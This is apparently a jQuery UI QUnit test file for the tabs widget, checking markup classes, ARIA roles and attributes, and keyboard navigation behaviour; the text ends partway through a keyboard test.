(function( $ ) {

var state = TestHelpers.tabs.state;

module( "tabs: core" );

test( "markup structure", function() {
	expect( 3 );
	var element = $( "#tabs1" ).tabs();
	ok( element.hasClass( "ui-tabs" ), "main element is .ui-tabs" );
	ok( element.find( "ul" ).hasClass( "ui-tabs-nav" ), "list item is .ui-tabs-nav" );
	equal( element.find( ".ui-tabs-panel" ).length, 3,
		".ui-tabs-panel elements exist, correct number" );
});

$.each({
	"deep ul": "#tabs3",
	"multiple lists, ul first": "#tabs4",
	"multiple lists, ol first": "#tabs5",
	"empty list": "#tabs6"
}, function( type, selector ) {
	test( "markup structure: " + type, function() {
		expect( 2 );
		var element = $( selector ).tabs();
		ok( element.hasClass( "ui-tabs" ), "main element is .ui-tabs" );
		ok( $( selector + "-list" ).hasClass( "ui-tabs-nav" ),
			"list item is .ui-tabs-nav" );
	});
});

// #5893 - Sublist in the tab list are considered as tab
test( "nested list", function() {
	expect( 1 );

	var element = $( "#tabs6" ).tabs();
	equal( element.data( "ui-tabs" ).anchors.length, 2, "should contain 2 tab" );
});

test( "disconnected from DOM", function() {
	expect( 2 );

	var element = $( "#tabs1" ).remove().tabs();
	equal( element.find( ".ui-tabs-nav" ).length, 1, "should initialize nav" );
	equal( element.find( ".ui-tabs-panel" ).length, 3, "should initialize panels" );
});

test( "non-tab list items", function() {
	expect( 2 );

	var element = $( "#tabs9" ).tabs();
	equal( element.tabs( "option", "active" ), 0, "defaults to first tab" );
	equal( element.find( ".ui-tabs-nav li.ui-state-active" ).index(), 1,
		"first actual tab is active" );
});

test( "aria-controls", function() {
	expect( 7 );
	var element = $( "#tabs1" ).tabs(),
		tabs = element.find( ".ui-tabs-nav li" );
	tabs.each(function() {
		var tab = $( this ),
			anchor = tab.find( ".ui-tabs-anchor" );
		equal( anchor.prop( "hash" ).substring( 1 ), tab.attr( "aria-controls" ) );
	});

	element = $( "#tabs2" ).tabs();
	tabs = element.find( ".ui-tabs-nav li" );
	equal( tabs.eq( 0 ).attr( "aria-controls" ), "colon:test" );
	equal( tabs.eq( 1 ).attr( "aria-controls" ), "inline-style" );
	ok( /^ui-tabs-\d+$/.test( tabs.eq( 2 ).attr( "aria-controls" ) ), "generated id" );
	equal( tabs.eq( 3 ).attr( "aria-controls" ), "custom-id" );
});

test( "accessibility", function() {
	expect( 49 );
	var element = $( "#tabs1" ).tabs({
			active: 1,
			disabled: [ 2 ]
		}),
		tabs = element.find( ".ui-tabs-nav li" ),
		anchors = tabs.find( ".ui-tabs-anchor" ),
		panels = element.find( ".ui-tabs-panel" );

	equal( element.find( ".ui-tabs-nav" ).attr( "role" ), "tablist", "tablist role" );
	tabs.each(function( index ) {
		var tab = tabs.eq( index ),
			anchor = anchors.eq( index ),
			anchorId = anchor.attr( "id" ),
			panel = panels.eq( index );
		equal( tab.attr( "role" ), "tab", "tab " + index + " role" );
		equal( tab.attr( "aria-labelledby" ), anchorId, "tab " + index + " aria-labelledby" );
		equal( anchor.attr( "role" ), "presentation", "anchor " + index + " role" );
		equal( anchor.attr( "tabindex" ), -1, "anchor " + index + " tabindex" );
		equal( panel.attr( "role" ), "tabpanel", "panel " + index + " role" );
		equal( panel.attr( "aria-labelledby" ), anchorId, "panel " + index + " aria-labelledby" );
	});

	equal( tabs.eq( 1 ).attr( "aria-selected" ), "true", "active tab has aria-selected=true" );
	equal( tabs.eq( 1 ).attr( "tabindex" ), 0, "active tab has tabindex=0" );
	equal( tabs.eq( 1 ).attr( "aria-disabled" ), null, "enabled tab does not have aria-disabled" );
	equal( panels.eq( 1 ).attr( "aria-expanded" ), "true", "active panel has aria-expanded=true" );
	equal( panels.eq( 1 ).attr( "aria-hidden" ), "false", "active panel has aria-hidden=false" );
	equal( tabs.eq( 0 ).attr( "aria-selected" ), "false", "inactive tab has aria-selected=false" );
	equal( tabs.eq( 0 ).attr( "tabindex" ), -1, "inactive tab has tabindex=-1" );
	equal( tabs.eq( 0 ).attr( "aria-disabled" ), null, "enabled tab does not have aria-disabled" );
	equal( panels.eq( 0 ).attr( "aria-expanded" ), "false", "inactive panel has aria-expanded=false" );
	equal( panels.eq( 0 ).attr( "aria-hidden" ), "true", "inactive panel has aria-hidden=true" );
	equal( tabs.eq( 2 ).attr( "aria-selected" ), "false", "inactive tab has aria-selected=false" );
	equal( tabs.eq( 2 ).attr( "tabindex" ), -1, "inactive tab has tabindex=-1" );
	equal( tabs.eq( 2 ).attr( "aria-disabled" ), "true", "disabled tab has aria-disabled=true" );
	equal( panels.eq( 2 ).attr( "aria-expanded" ), "false", "inactive panel has aria-expanded=false" );
	equal( panels.eq( 2 ).attr( "aria-hidden" ), "true", "inactive panel has aria-hidden=true" );

	element.tabs( "option", "active", 0 );
	equal( tabs.eq( 0 ).attr( "aria-selected" ), "true", "active tab has aria-selected=true" );
	equal( tabs.eq( 0 ).attr( "tabindex" ), 0, "active tab has tabindex=0" );
	equal( tabs.eq( 0 ).attr( "aria-disabled" ), null, "enabled tab does not have aria-disabled" );
	equal( panels.eq( 0 ).attr( "aria-expanded" ), "true", "active panel has aria-expanded=true" );
	equal( panels.eq( 0 ).attr( "aria-hidden" ), "false", "active panel has aria-hidden=false" );
	equal( tabs.eq( 1 ).attr( "aria-selected" ), "false", "inactive tab has aria-selected=false" );
	equal( tabs.eq( 1 ).attr( "tabindex" ), -1, "inactive tab has tabindex=-1" );
	equal( tabs.eq( 1 ).attr( "aria-disabled" ), null, "enabled tab does not have aria-disabled" );
	equal( panels.eq( 1 ).attr( "aria-expanded" ), "false", "inactive panel has aria-expanded=false" );
	equal( panels.eq( 1 ).attr( "aria-hidden" ), "true", "inactive panel has aria-hidden=true" );
	equal( tabs.eq( 2 ).attr( "aria-selected" ), "false", "inactive tab has aria-selected=false" );
	equal( tabs.eq( 2 ).attr( "tabindex" ), -1, "inactive tab has tabindex=-1" );
	equal( tabs.eq( 2 ).attr( "aria-disabled" ), "true", "disabled tab has aria-disabled=true" );
	equal( panels.eq( 2 ).attr( "aria-expanded" ), "false", "inactive panel has aria-expanded=false" );
	equal( panels.eq( 2 ).attr( "aria-hidden" ), "true", "inactive panel has aria-hidden=true" );
});

asyncTest( "accessibility - ajax", function() {
	expect( 4 );
	var element = $( "#tabs2" ).tabs(),
		panel = $( "#custom-id" );

	equal( panel.attr( "aria-live" ), "polite", "remote panel has aria-live" );
	equal( panel.attr( "aria-busy" ), null, "does not have aria-busy on init" );
	element.tabs( "option", "active", 3 );
	equal( panel.attr( "aria-busy" ), "true", "panel has aria-busy during load" );
	element.one( "tabsload", function() {
		setTimeout(function() {
			equal( panel.attr( "aria-busy" ), null, "panel does not have aria-busy after load" );
			start();
		}, 1 );
	});
});

asyncTest( "keyboard support - LEFT, RIGHT, UP, DOWN, HOME, END, SPACE, ENTER", function() {
	expect( 92 );
	var element = $( "#tabs1" ).tabs({
			collapsible: true
		}),
		tabs = element.find( ".ui-tabs-nav li" ),
		panels = element.find( ".ui-tabs-panel" ),
		keyCode = $.ui.keyCode;

	element.data( "ui-tabs" ).delay = 50;

	equal( tabs.filter( ".ui-state-focus" ).length, 0, "no tabs focused on init" );
	tabs.eq( 0 ).simulate( "focus" );

	// down, right, down (wrap), up (wrap)
	function step1() {
		ok( tabs.eq( 0 ).is( ".ui-state-focus" ), "first tab has focus" );
		equal( tabs.eq( 0 ).attr( "aria-selected" ), "true", "first tab has aria-selected=true" );
		ok( panels.eq( 0 ).is( ":visible" ), "first panel is visible" );

		tabs.eq( 0 ).simulate( "keydown", { keyCode: keyCode.DOWN } );
		ok( tabs.eq( 1 ).is( ".ui-state-focus" ), "DOWN moves focus to next tab" );
		ok( !tabs.eq( 0 ).is( ".ui-state-focus" ), "first tab is no longer focused" );
		equal( tabs.eq( 1 ).attr( "aria-selected" ), "true", "second tab has aria-selected=true" );
		equal( tabs.eq( 0 ).attr( "aria-selected" ), "false", "first tab has aria-selected=false" );
		ok( panels.eq( 1 ).is( ":hidden" ), "second panel is still hidden" );
		equal( panels.eq( 1 ).attr( "aria-expanded" ), "false", "second panel has aria-expanded=false" );
		equal( panels.eq( 1 ).attr( "aria-hidden" ), "true", "second panel has aria-hidden=true" );
		ok( panels.eq( 0 ).is( ":visible" ), "first panel is still visible" );
		equal( panels.eq( 0 ).attr( "aria-expanded" ), "true", "first panel has aria-expanded=true" );
		equal( panels.eq( 0 ).attr( "aria-hidden" ), "false", "first panel has aria-hidden=false" );

		tabs.eq( 1 ).simulate( "keydown", { keyCode: keyCode.RIGHT } );
		ok( tabs.eq( 2 ).is( ".ui-state-focus" ), "RIGHT moves focus to next tab" );
		equal( tabs.eq( 2 ).attr( "aria-selected" ), "true", "third tab has aria-selected=true" );
		equal( tabs.eq( 1 ).attr( "aria-selected" ), "false", "second tab has aria-selected=false" );
		ok( panels.eq( 2 ).is( ":hidden" ), "third panel is still hidden" );
		equal( panels.eq( 2 ).attr( "aria-expanded" ), "false", "third panel has aria-expanded=false" );
		equal( panels.eq( 2 ).attr( "aria-hidden" ), "true", "third panel has aria-hidden=true" );
		ok( panels.eq( 0 ).is( ":visible" ), "first panel is still visible" );
		equal( panels.eq( 0 ).attr( "aria-expanded" ), "true", "first panel has aria-expanded=true" );
		equal( panels.eq( 0 ).attr( "aria-hidden" ), "false", "first panel has aria-hidden=false" );

		tabs.eq( 2 ).simulate( "keydown", { keyCode: keyCode.DOWN } );
		ok( tabs.eq( 0 ).is( ".ui-state-focus" ), "DOWN wraps focus to first tab" );
		equal( tabs.eq( 0 ).attr( "aria-selected" ), "true", "first tab has aria-selected=true" );
		equal( tabs.eq( 2 ).attr( "aria-selected" ), "false", "third tab has aria-selected=false" );
		ok( panels.eq( 0 ).is( ":visible" ), "first panel is still visible" );
		equal( panels.eq( 0 ).attr( "aria-expanded" ), "true", "first panel has aria-expanded=true" );
		equal( panels.eq( 0 ).attr( "aria-hidden" ), "false", "first panel has aria-hidden=false" );

		tabs.eq( 0 ).simulate( "keydown", { keyCode: keyCode.UP } );
		ok( tabs.eq( 2 ).is( ".ui-state-focus" ), "UP wraps focus to last tab" );
		equal( tabs.eq( 2 ).attr( "aria-selected" ), "true", "third tab has aria-selected=true" );
		equal( tabs.eq( 0 ).attr( "aria-selected" ), "false", "first tab has aria-selected=false" );
		ok( panels.eq( 2 ).is( ":hidden" ), "third panel is still hidden" );
		equal( panels.eq( 2 ).attr( "aria-expanded" ), "false", "third panel has aria-expanded=false" );
		equal( panels.eq( 2 ).attr( "aria-hidden" ), "true", "third panel has aria-hidden=true" );
		ok( panels.eq( 0 ).is( ":visible" ), "first panel is still visible" );
		equal( panels.eq( 0 ).attr( "aria-expanded" ), "true", "first panel has aria-expanded=true" );
		equal( panels.eq( 0 ).attr( "aria-hidden" ), "false", "first panel has aria-hidden=false" );

		setTimeout( step2, 100 );
	}

	// left, home, space
	function step2() {
		equal( tabs.eq( 2 ).attr( "aria-selected" ), "true", "third tab has aria-selected=true" );
		equal( tabs.eq( 0 ).attr( "aria-selected" ), "false", "first tab has aria-selected=false" );
		ok( panels.eq( 2 ).is( ":visible" ), "third panel is visible" );
		equal( panels.eq( 2 ).attr( "aria-expanded" ), "true", "third panel has aria-expanded=true" );
		equal( panels.eq( 2 ).attr( "aria-hidden" ), "false", "third panel has aria-hidden=false" );
		ok( panels.eq( 0 ).is( ":hidden" ), "first panel is hidden" );
		equal( panels.eq( 0 ).attr( "aria-expanded" ), "false", "first panel has aria-expanded=false" );
		equal( panels.eq( 0 ).attr( "aria-hidden" ), "true", "first panel has aria-hidden=true" );

		tabs.eq( 2 ).simulate( "keydown", { keyCode: keyCode.LEFT } );
		ok( tabs.eq( 1 ).is( ".ui-state-focus" ), "LEFT moves focus to previous tab" );
		equal( tabs.eq( 1 ).attr( "aria-selected" ), "true", "second tab has aria-selected=true" );
		equal( tabs.eq( 2 ).attr( "aria-selected" ), "false", "third tab has aria-selected=false" );
		ok( panels.eq( 1 ).is( ":hidden" ), "second panel is still hidden" );
		equal( panels.eq( 1 ).attr( "aria-expanded" ), "false", "second panel has aria-expanded=false" );
		equal( panels.eq( 1 ).attr( "aria-hidden" ), "true", "second panel has aria-hidden=true" );
		ok( panels.eq( 2 ).is( ":visible" ), "third panel is still visible" );
		equal( panels.eq( 2 ).attr( "aria-expanded" ), "true", "third panel has aria-expanded=true" );
		equal( panels.eq( 2 ).attr( "aria-hidden" ), "false", "third panel has aria-hidden=false" );

		tabs.eq( 1 ).simulate( "keydown", { keyCode: keyCode.HOME } );
		ok( tabs.eq( 0 ).is( ".ui-state-focus" ), "HOME moves focus to first tab" );
		equal( tabs.eq( 0 ).attr( "aria-selected" ), "true", "first tab has aria-selected=true" );
		equal( tabs.eq( 1 ).attr( "aria-selected" ), "false", "second tab has aria-selected=false" );
		ok( panels.eq( 0 ).is( ":hidden" ), "first panel is still hidden" );
		equal( panels.eq( 0 ).attr( "aria-expanded" ), "false", "first panel has aria-expanded=false" );
		equal( panels.eq( 0 ).attr( "aria-hidden" ), "true", "first panel has aria-hidden=true" );
		ok( panels.eq( 2 ).is( ":visible" ), "third panel is still visible" );
		equal( panels.eq( 2 ).attr( "aria-expanded" ), "true", "third panel has aria-expanded=true" );
		equal( panels.eq( 2 ).attr( "aria-hidden" ), "false", "third panel has aria-hidden=false" );

		// SPACE activates, cancels delay
		tabs.eq( 0 ).simulate( "keydown", { keyCode: keyCode.SPACE } );
		setTimeout( step3, 1 );
	}

	// end, enter
	function step3() {
		equal( tabs.eq( 0 ).attr( "aria-selected" ), "true", "first tab has aria-selected=true" );
		equal( tabs.eq( 2 ).attr( "aria-selected" ), "false", "third tab has aria-selected=false" );
		ok( panels.eq( 0 ).is( ":visible" ), "first panel is visible" );
		equal( panels.eq( 0 ).attr( "aria-expanded" ), "true", "first panel has aria-expanded=true" );
		equal( panels.eq( 0 ).attr( "aria-hidden" ), "false", "first panel has aria-hidden=false" );
		ok( panels.eq( 2 ).is( ":hidden" ), "third panel is hidden" );
		equal( panels.eq( 2 ).attr( "aria-expanded" ), "false", "third panel has aria-expanded=false" );
		equal( panels.eq( 2 ).attr( "aria-hidden" ), "true", "third panel has aria-hidden=true" );

		tabs.eq( 0 ).simulate( "keydown", { keyCode: keyCode.END } );
		ok( tabs.eq( 2 ).is( ".ui-state-focus" ), "END moves focus to last tab" );
		equal( tabs.eq( 2 ).attr( "aria-selected" ), "true", "third tab has aria-selected=true" );
		equal( tabs.eq( 0 ).attr( "aria-selected" ), "false", "first tab has aria-selected=false" );
		ok( panels.eq( 2 ).is( ":hidden" ), "third panel is still hidden" );
		equal( panels.eq( 2 ).attr( "aria-expanded" ), "false", "third panel has aria-expanded=false" );
		equal( panels.eq( 2 ).attr( "aria-hidden" ), "true", "third panel has aria-hidden=true" );
		ok( panels.eq( 0 ).is( ":visible" ), "first panel is still visible" );
		equal( panels.eq( 0 ).attr( "aria-expanded" ), "true", "first panel has aria-expanded=true" );
		equal( panels.eq( 0 ).attr( "aria-hidden" ), "false", "first panel has aria-hidden=false" );

		// ENTER activates, cancels delay
		tabs.eq( 0 ).simulate( "keydown", { keyCode: keyCode.ENTER } );
		setTimeout( step4, 1 );
	}

	// enter (collapse)
	function step4() {
		equal( tabs.eq( 2 ).attr( "aria-selected" ), "true", "third tab has aria-selected=true" );
		ok( panels.eq( 2 ).is( ":visible" ), "third panel is visible" );
		equal( panels.eq( 2 ).attr( "aria-expanded" ), "true", "third panel has aria-expanded=true" );
		equal( panels.eq( 2 ).attr( "aria-hidden" ), "false", "third panel has aria-hidden=false" );
		ok( panels.eq( 0 ).is( ":hidden" ), "first panel is hidden" );
		equal( panels.eq( 0 ).attr( "aria-expanded" ), "false", "first panel has aria-expanded=false" );
		equal( panels.eq( 0 ).attr( "aria-hidden" ), "true", "first panel has aria-hidden=true" );

		// ENTER collapses if active
		tabs.eq( 2 ).simulate( "keydown", { keyCode: keyCode.ENTER } );
		equal( tabs.eq( 2 ).attr( "aria-selected" ), "false", "third tab has aria-selected=false" );
		ok( panels.eq( 2 ).is( ":hidden" ), "third panel is hidden" );
		equal( panels.eq( 2 ).attr( "aria-expanded" ), "false", "third panel has aria-expanded=false" );
		equal( panels.eq( 2 ).attr( "aria-hidden" ), "true", "third panel has aria-hidden=true" );

		setTimeout( start, 1 );
	}

	setTimeout( step1, 1 );
});

asyncTest( "keyboard support - CTRL navigation", function() {
	expect( 115 );
	var element = $( "#tabs1" ).tabs(),
		tabs = element.find( ".ui-tabs-nav li" ),
		panels = element.find( ".ui-tabs-panel" ),
		keyCode = $.ui.keyCode;

	element.data( "ui-tabs" ).delay = 50;

	equal( tabs.filter( ".ui-state-focus" ).length, 0, "no tabs focused on init" );
	tabs.eq( 0 ).simulate( "focus" );

	// down
	function step1() {
		ok( tabs.eq( 0 ).is( ".ui-state-focus" ), "first tab has focus" );
		equal( tabs.eq( 0 ).attr( "aria-selected" ), "true", "first tab has aria-selected=true" );
		ok( panels.eq( 0 ).is( ":visible" ), "first panel is visible" );

		tabs.eq( 0 ).simulate( "keydown", { keyCode: keyCode.DOWN, ctrlKey: true } );
		ok( tabs.eq( 1 ).is( ".ui-state-focus" ), "DOWN moves focus to next tab" );
		ok( !tabs.eq( 0 ).is( ".ui-state-focus" ), "first tab is no longer focused" );
		equal( tabs.eq( 1 ).attr( "aria-selected" ), "false", "second tab has aria-selected=false" );
		equal( tabs.eq( 0 ).attr( "aria-selected" ), "true", "first tab has aria-selected=true" );
		ok( panels.eq( 1 ).is( ":hidden" ), "second panel is still hidden" );
		equal( panels.eq( 1 ).attr( "aria-expanded" ), "false", "second panel has aria-expanded=false" );
		equal( panels.eq( 1 ).attr( "aria-hidden" ), "true", "second panel has aria-hidden=true" );
		ok( panels.eq( 0 ).is( ":visible" ), "first panel is still visible" );
		equal( panels.eq( 0 ).attr( "aria-expanded" ), "true", "first panel has aria-expanded=true" );
		equal( panels.eq( 0 ).attr( "aria-hidden" ), "false", "first panel has aria-hidden=false" );

		setTimeout( step2, 100 );
	}

	// right
	function step2() {
		equal( tabs.eq( 0 ).attr( "aria-selected" ), "true", "first tab has aria-selected=true" );
		ok( panels.eq( 0 ).is( ":visible" ), "first panel is visible" );
		equal( panels.eq( 0 ).attr( "aria-expanded" ), "true", "first panel has aria-expanded=true" );
		equal( panels.eq( 0 ).attr( "aria-hidden" ), "false", "first panel has aria-hidden=false" );
		ok( panels.eq( 1 ).is( ":hidden" ), "second panel is hidden" );
		equal( panels.eq( 1 ).attr( "aria-expanded" ), "false", "second panel has aria-expanded=false" );
		equal( panels.eq( 1 ).attr( "aria-hidden" ), "true", "second panel has aria-hidden=true" );

		tabs.eq( 1 ).simulate( "keydown", { keyCode: keyCode.RIGHT, ctrlKey: true } );
		ok( tabs.eq( 2 ).is( ".ui-state-focus" ), "RIGHT moves focus to next tab" );
		equal( tabs.eq( 2 ).attr( "aria-selected" ), "false", "third tab has aria-selected=false" );
		equal( tabs.eq( 0 ).attr( "aria-selected" ), "true", "first tab has aria-selected=true" );
		ok( panels.eq( 2 ).is( ":hidden" ), "third panel is still hidden" );
		equal( panels.eq( 2 ).attr( "aria-expanded" ), "false", "third panel has aria-expanded=false" );
		equal( panels.eq( 2 ).attr( "aria-hidden" ), "true", "third panel has aria-hidden=true" );
		ok( panels.eq( 0 ).is( ":visible" ), "first panel is still visible" );
		equal( panels.eq( 0 ).attr( "aria-expanded" ), "true", "first panel has aria-expanded=true" );
		equal( panels.eq( 0 ).attr( "aria-hidden" ), "false", "first panel has aria-hidden=false" );

		setTimeout( step3, 100 );
	}

	// down (wrap)
	function step3() {
		equal( tabs.eq( 0 ).attr( "aria-selected" ), "true", "first tab has aria-selected=true" );
		ok( panels.eq( 0 ).is( ":visible" ), "first panel is visible" );
		equal( panels.eq( 0 ).attr( "aria-expanded" ), "true", "first panel has aria-expanded=true" );
		equal( panels.eq( 0 ).attr( "aria-hidden" ), "false", "first panel has aria-hidden=false" );
		ok( panels.eq( 2 ).is( ":hidden" ), "third panel is hidden" );
		equal( panels.eq( 2 ).attr( "aria-expanded" ), "false", "third panel has aria-expanded=false" );
		equal( panels.eq( 2 ).attr( "aria-hidden" ), "true", "third panel has aria-hidden=true" );

		tabs.eq( 2 ).simulate( "keydown", { keyCode: keyCode.DOWN, ctrlKey: true } );
		ok( tabs.eq( 0 ).is( ".ui-state-focus" ), "DOWN wraps focus to first tab" );
		equal( tabs.eq( 0 ).attr( "aria-selected" ), "true", "first tab has aria-selected=true" );
		ok( panels.eq( 0 ).is( ":visible" ), "first panel is still visible" );
		equal( panels.eq( 0 ).attr( "aria-expanded" ), "true", "first panel has aria-expanded=true" );
		equal( panels.eq( 0 ).attr( "aria-hidden" ), "false", "first panel has aria-hidden=false" );

		setTimeout( step4, 100 );
	}

	// up (wrap)
	function step4() {
		equal( tabs.eq( 0 ).attr( "aria-selected" ), "true", "first tab has aria-selected=true" );
		ok( panels.eq( 0 ).is( ":visible" ), "first panel is visible" );
		equal( panels.eq( 0 ).attr( "aria-expanded" ), "true", "first panel has aria-expanded=true" );
		equal( panels.eq( 0 ).attr( "aria-hidden" ), "false", "first panel has aria-hidden=false" );

		tabs.eq( 0 ).simulate( "keydown", { keyCode: keyCode.UP, ctrlKey: true } );
		ok( tabs.eq( 2 ).is( ".ui-state-focus" ), "UP wraps focus to last tab" );
		equal( tabs.eq( 2 ).attr( "aria-selected" ), "false", "third tab has aria-selected=false" );
		equal( tabs.eq( 0 ).attr( "aria-selected" ), "true", "first tab has aria-selected=true" );
		ok( panels.eq( 2 ).is( ":hidden" ), "third panel is still hidden" );
		equal( panels.eq( 2 ).attr( "aria-expanded" ), "false", "third panel has aria-expanded=false" );
		equal( panels.eq( 2 ).attr( "aria-hidden" ), "true", "third panel has aria-hidden=true" );
		ok( panels.eq( 0 ).is( ":visible" ), "first panel is still visible" );
		equal( panels.eq( 0 ).attr( "aria-expanded" ), "true", "first panel has aria-expanded=true" );
		equal( panels.eq( 0 ).attr( "aria-hidden" ), "false", "first panel has aria-hidden=false" );

		setTimeout( step5, 100 );
	}

	// left
	function step5() {
		equal( tabs.eq( 0 ).attr( "aria-selected" ), "true", "first tab has aria-selected=true" );
		ok( panels.eq( 0 ).is( ":visible" ), "first panel is visible" );
		equal( panels.eq( 0 ).attr( "aria-expanded" ), "true", "first panel has aria-expanded=true" );
		equal( panels.eq( 0 ).attr( "aria-hidden" ), "false", "first panel has aria-hidden=false" );
		ok( panels.eq( 2 ).is( ":hidden" ), "third panel is hidden" );
		equal( panels.eq( 2 ).attr( "aria-expanded" ), "false", "third panel has aria-expanded=false" );
		equal( panels.eq( 2 ).attr( "aria-hidden" ), "true", "third panel has aria-hidden=true" );

		tabs.eq( 2 ).simulate( "keydown", { keyCode: keyCode.LEFT, ctrlKey: true } );
		ok( tabs.eq( 1 ).is( ".ui-state-focus" ), "LEFT moves focus to previous tab" );
		equal( tabs.eq( 1 ).attr( "aria-selected" ), "false", "second tab has aria-selected=false" );
		equal( tabs.eq( 0 ).attr( "aria-selected" ), "true", "first tab has aria-selected=true" );
		ok( panels.eq( 1 ).is( ":hidden" ), "second panel is still hidden" );
		equal( panels.eq( 1 ).attr( "aria-expanded" ), "false", "second panel has aria-expanded=false" );
		equal( panels.eq( 1 ).attr( "aria-hidden" ), "true", "second panel has aria-hidden=true" );
		ok( panels.eq( 0 ).is( ":visible" ), "first panel is still visible" );
		equal( panels.eq( 0 ).attr( "aria-expanded" ), "true", "first panel has aria-expanded=true" );
		equal( panels.eq( 0 ).attr( "aria-hidden" ), "false", "first panel has aria-hidden=false" );

		setTimeout( step6, 100 );
	}

	// home
	function step6() {
		equal( tabs.eq( 0 ).attr( "aria-selected" ), "true", "first tab has aria-selected=true" );
		ok( panels.eq( 0 ).is( ":visible" ), "first panel is visible" );
		equal( panels.eq( 0 ).attr( "aria-expanded" ), "true", "first panel has aria-expanded=true" );
		equal( panels.eq( 0 ).attr( "aria-hidden" ), "false", "first panel has aria-hidden=false" );
		ok( panels.eq( 1 ).is( ":hidden" ), "second panel is hidden" );
		equal( panels.eq( 1 ).attr( "aria-expanded" ), "false", "second panel has aria-expanded=false" );
		equal( panels.eq( 1 ).attr( "aria-hidden" ), "true", "second panel has aria-hidden=true" );

		tabs.eq( 1 ).simulate( "keydown", { keyCode: keyCode.HOME, ctrlKey: true } );
		ok( tabs.eq( 0 ).is( ".ui-state-focus" ), "HOME moves focus to first tab" );
		equal( tabs.eq( 0 ).attr( "aria-selected" ), "true", "first tab has aria-selected=true" );
		equal( tabs.eq( 1 ).attr( "aria-selected" ), "false", "second tab has aria-selected=false" );
		ok( panels.eq( 1 ).is( ":hidden" ), "second panel is still hidden" );
		equal( panels.eq( 1 ).attr( "aria-expanded" ), "false", "second panel has aria-expanded=false" );
		equal( panels.eq( 1 ).attr( "aria-hidden" ), "true", "second panel has aria-hidden=true" );
		ok( panels.eq( 0 ).is( ":visible" ), "first panel is still visible" );
		equal( panels.eq( 0 ).attr( "aria-expanded" ), "true", "first panel has aria-expanded=true" );
		equal( panels.eq( 0 ).attr( "aria-hidden" ), "false", "first panel has aria-hidden=false" );

		setTimeout( step7, 100 );
	}

	// end
	function step7() {
		equal( tabs.eq( 0 ).attr( "aria-selected" ), "true", "first tab has aria-selected=true" );
		ok( panels.eq( 0 ).is( ":visible" ), "first panel is visible" );
		equal( panels.eq( 0 ).attr( "aria-expanded" ), "true", "first panel has aria-expanded=true" );
		equal( panels.eq( 0 ).attr( "aria-hidden" ), "false", "first panel has aria-hidden=false" );

		tabs.eq( 0 ).simulate( "keydown", { keyCode: keyCode.END, ctrlKey: true } );
		ok( tabs.eq( 2 ).is( ".ui-state-focus" ), "END moves focus to last tab" );
		equal( tabs.eq( 2 ).attr( "aria-selected" ), "false", "third tab has aria-selected=false" );
		equal( tabs.eq( 0 ).attr( "aria-selected" ), "true", "first tab has aria-selected=true" );
		ok( panels.eq( 2 ).is( ":hidden" ), "third panel is still hidden" );
		equal( panels.eq( 2 ).attr( "aria-expanded" ), "false", "third panel has aria-expanded=false" );
		equal( panels.eq( 2 ).attr( "aria-hidden" ), "true", "third panel has aria-hidden=true" );
		ok( panels.eq( 0 ).is( ":visible" ), "first panel is still visible" );
		equal( panels.eq( 0 ).attr( "aria-expanded" ), "true", "first panel has aria-expanded=true" );
		equal( panels.eq( 0 ).attr( "aria-hidden" ), "false", "first panel has aria-hidden=false" );

		setTimeout( step8, 100 );
	}

	// space
	function step8() {
		equal( tabs.eq( 0 ).attr( "aria-selected" ), "true", "first tab has aria-selected=true" );
		ok( panels.eq( 0 ).is( ":visible" ), "first panel is visible" );
		equal( panels.eq( 0 ).attr( "aria-expanded" ), "true", "first panel has aria-expanded=true" );
		equal( panels.eq( 0 ).attr( "aria-hidden" ), "false", "first panel has aria-hidden=false" );
		ok( panels.eq( 2 ).is( ":hidden" ), "third panel is hidden" );
		equal( panels.eq( 2 ).attr( "aria-expanded" ), "false", "third panel has aria-expanded=false" );
		equal( panels.eq( 2 ).attr( "aria-hidden" ), "true", "third panel has aria-hidden=true" );

		tabs.eq( 2 ).simulate( "keydown", { keyCode: keyCode.SPACE } );
		equal( tabs.eq( 2 ).attr( "aria-selected" ), "true", "third tab has aria-selected=true" );
		equal( tabs.eq( 0 ).attr( "aria-selected" ), "false", "first tab has aria-selected=false" );
		ok( panels.eq( 2 ).is( ":visible" ), "third panel is visible" );
		equal( panels.eq( 2 ).attr( "aria-expanded" ), "true", "third panel has aria-expanded=true" );
		equal( panels.eq( 2 ).attr( "aria-hidden" ), "false", "third panel has aria-hidden=false" );
		ok( panels.eq( 0 ).is( ":hidden" ), "first panel is hidden" );
		equal( panels.eq( 0 ).attr( "aria-expanded" ), "false", "first panel has aria-expanded=false" );
		equal( panels.eq( 0 ).attr( "aria-hidden" ), "true", "first panel has aria-hidden=true" );

		setTimeout( start, 1 );
	}

	setTimeout( step1, 1 );
});

asyncTest( "keyboard support - CTRL+UP, ALT+PAGE_DOWN, ALT+PAGE_UP", function() {
	expect( 50 );
	var element = $( "#tabs1" ).tabs(),
		tabs = element.find( ".ui-tabs-nav li" ),
		panels = element.find( ".ui-tabs-panel" ),
		keyCode = $.ui.keyCode;

	equal( tabs.filter( ".ui-state-focus" ).length, 0, "no tabs focused on init" );
	panels.attr( "tabindex", -1 );
	panels.eq( 0 ).simulate( "focus" );

	function step1() {
		strictEqual( document.activeElement, panels[ 0 ], "first panel is activeElement" );

		panels.eq( 0 ).simulate( "keydown", { keyCode: keyCode.PAGE_DOWN, altKey: true } );
		strictEqual( document.activeElement, tabs[ 1 ], "second tab is activeElement" );
		ok( tabs.eq( 1 ).is( ".ui-state-focus" ), "ALT+PAGE_DOWN moves focus to next tab" );
		equal( tabs.eq( 1 ).attr( "aria-selected" ), "true", "second tab has aria-selected=true" );
		ok( panels.eq( 1 ).is( ":visible" ), "second panel is visible" );
		equal( panels.eq( 1 ).attr( "aria-expanded" ), "true", "second panel has aria-expanded=true" );
		equal( panels.eq( 1 ).attr( "aria-hidden" ), "false", "second panel has aria-hidden=false" );
		ok( panels.eq( 0 ).is( ":hidden" ), "first panel is hidden" );
		equal( panels.eq( 0 ).attr( "aria-expanded" ), "false", "first panel has aria-expanded=false" );
		equal( panels.eq( 0 ).attr( "aria-hidden" ), "true", "first panel has aria-hidden=true" );

		tabs.eq( 1 ).simulate( "keydown", { keyCode: keyCode.PAGE_DOWN, altKey: true } );
		strictEqual( document.activeElement, tabs[ 2 ], "third tab is activeElement" );
		ok( tabs.eq( 2 ).is( ".ui-state-focus" ), "ALT+PAGE_DOWN moves focus to next tab" );
		equal( tabs.eq( 2 ).attr( "aria-selected" ), "true", "third tab has aria-selected=true" );
		ok( panels.eq( 2 ).is( ":visible" ), "third panel is visible" );
